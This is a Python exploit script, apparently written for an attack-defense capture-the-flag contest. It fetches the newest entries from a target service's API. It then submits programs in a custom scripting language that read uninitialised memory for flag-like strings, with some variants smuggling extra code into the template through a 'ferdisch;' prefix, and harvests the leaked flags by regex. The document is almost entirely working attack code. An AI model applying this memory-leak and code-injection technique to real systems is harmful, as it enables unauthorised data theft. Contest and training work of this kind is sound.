from __future__ import print_function, unicode_literals

import sys
import time

import requests
import re

basiccode = '''
holmol "stdlib.sl";

eija print_sub(arr: lischd byte, pos: int) gebbtserick int: {
	var size: int = grees arr - pos;
	var tmp: lischd byte = neie lischd byte (size);
	var i: int = 0;
	solang i < size: {
		tmp@i = arr@(pos+i);
		i = i + 1;
	}
	mach sahmol_as_str(tmp);
}

eija leak(size: int, count: int) gebbtserick int: {
	var i: int = 0;
	solang i < count: {
		var arr: lischd byte = neie lischd byte(size);
		var j: int = 0;
		solang j < grees arr - 8: {
			// SA / Te
			falls (arr@j == 83 unn arr@(j+1) == 65 unn arr@(j+2) == 65) odder (arr@j == 84 unn arr@(j+1) == 101) odder (arr@j == 123): {
				mach sahmol(i);
				mach sahmol(j);
				mach print_sub(arr, j);
			}
			j = j + 1;
		}

		i = i + 1;
	}
}

eija main() gebbtserick int: {
	MAINFUNCTION
}
'''


codeoptions = [
	'mach leak(80, 64);',
	'ferdisch; mach leak(64, 64);',
	'ferdisch; mach leak(90, 64);'
]


def exploit(target):
	url = 'http://{}:9080/api'.format(target)
	# newest cave
	caves = requests.get(url+'/caves/list').json()
	caves.sort(key=lambda cave: cave['created'])
	caves = caves[-10:][::-1] # newest 10 caves, newest first

	flags = []

	for cave in caves:
		print(requests.get(url+'/caves/{}'.format(cave['id'])).status_code)
		for option in codeoptions:
			code = basiccode.replace('MAINFUNCTION', option)
			response = requests.post(url+'/visit', json={"cave_id": cave['id'], "files": {"entry.sl": code}})
			print('Status:', response.status_code)
			print(response.content)
			flags += re.findall(r'\{[a-zA-Z0-9+/=]+\}', response.text)

	print('\n')
	for f in flags:
		print('SAAR'+f)


if __name__ == '__main__':
	if len(sys.argv) > 1:
		exploit(sys.argv[1])
	else:
		exploit('localhost')
